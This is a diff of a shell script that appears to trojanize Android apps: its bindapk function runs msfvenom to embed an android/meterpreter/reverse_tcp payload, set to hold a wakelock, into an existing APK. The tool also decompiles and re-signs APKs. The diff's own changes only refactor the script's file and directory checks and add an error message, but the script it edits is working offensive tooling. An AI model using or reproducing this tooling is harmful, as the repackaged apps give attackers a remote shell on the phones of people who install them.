@@ -30,6 +30,20 @@ print_status() {
 	printf "${blue}[*] ${green}${1}\n${reset}"
 }
 
+file_exist() {
+	if [ ! -e "${1}" ]; then
+		error_msg "file (${1}) does not exist"
+		exit 1
+	fi
+}
+
+dir_exist() {
+	if [ ! -d "${1}" ]; then
+		error_msg "directory (${1}) does not exist"
+		exit 1
+	fi
+}
+
 decompile() {
 	print_status "Decompiling ${1}"
 	apktool d ${1} -o ${2}
@@ -51,6 +65,10 @@ signapk() {
 bindapk() {
 	print_status "Binding ${3}"
 	msfvenom -x ${3} -p android/meterpreter/reverse_tcp LHOST=${1} LPORT=${2} --platform android --arch dalvik AndroidMeterpreterDebug=true AndroidWakelock=true -o ${4}
+	if [ ! -e ${4} ]; then
+		error_msg "Can't bind, take screenshot and open a issue on github"
+		exit 1
+	fi
 	print_status "Binded to ${4}"
 }
 
@@ -63,14 +81,8 @@ validate_input() {
 		fi
 		LHOST=${2}
 		LPORT=${3}
-		if [ ! -e "${4}" ]; then
-			error_msg "file (${4}) does not exist"
-			exit 1
-		fi
-		if [ ! -d "${5%\/*}" ]; then
-			error_msg "directory (${5%\/*}) does not exist"
-			exit 1
-		fi
+		file_exist "${4}"
+		dir_exist "${5%\/*}"
 	fi
 	if [ ! "${1}" = "-b" -a "$#" -ne 3 ]; then
 		usage
@@ -78,24 +90,12 @@ validate_input() {
 	fi
 
 	if [ "${1}" = "-d" -o "${1}" = "-s" ]; then
-		if [ ! -e "${2}" ]; then
-			error_msg "file (${2}) does not exist"
-			exit 1
-		fi
-		if [ ! -d "${3%\/*}" ]; then
-			error_msg "directory (${3%\/*}) does not exist"
-			exit 1
-		fi
+		file_exist "${2}"
+		dir_exist "${3%\/*}"
 	fi
 	if [ "${1}" = "-r" ]; then
-		if [ ! -d "${2}" ]; then
-			error_msg "file (${2}) does not exist"
-			exit 1
-		fi
-		if [ ! -d "${3%\/*}" ]; then
-			error_msg "directory (${3%\/*}) does not exist"
-			exit 1
-		fi
+		dir_exist "${2}"
+		dir_exist "${3%\/*}"
 	fi
 }
 
